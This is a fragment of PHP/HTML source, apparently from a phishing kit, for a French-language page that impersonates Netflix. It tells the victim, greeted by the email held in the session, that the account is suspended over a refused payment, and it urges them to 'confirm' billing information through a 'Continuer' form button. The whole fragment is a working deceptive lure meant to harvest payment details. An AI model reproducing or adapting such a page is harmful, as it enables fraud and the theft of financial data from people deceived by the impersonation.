...
<html><head>
    ...
    <center><img style="width: 80px;" src="../img/security.png"></center>
...
<h1>Compte suspendu.</h1>
    ...
    Bonjour <?php echo $_SESSION['email']; ?>, <br><br>
    
    Le dernier paiement de votre abonnement Netflix a été refusé par notre systeme anti-fraude.

<br>

Pour pouvoir continuer à utiliser nos services, nous vous invitons à mettre à jour vos informations de facturation.
<br>
Cette confirmation est obligatoire si vous souhaitez garder votre compte netflix.

<br>

</p>
<p style="font-size: 11px; color: white;">
Cliquez sur continuer pour confirmer vos informations.
</p>
...
<p></p>
    <div class="form-group">
                        ...
                        <div class="form-group">
                            <button type="submit" name="auths">Continuer</button>
